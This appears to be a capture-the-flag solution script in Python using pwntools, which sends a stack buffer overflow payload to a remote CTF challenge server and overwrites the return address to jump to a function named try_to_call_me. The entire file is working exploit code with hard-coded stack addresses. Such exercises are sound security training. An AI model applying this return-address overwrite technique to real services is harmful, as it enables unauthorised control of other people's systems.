#coding=utf-8
from pwn import *

r = remote('edu-ctf.csie.org', 10170)
#r = process('./bof')
stack = 0x7fffffffe390
ret = 0x7fffffffe3c8
junk = 0x400546
try_to_call_me = 0x400687

r.sendline('a' * (ret - stack) + p64(junk) + p64(try_to_call_me))
r.interactive()

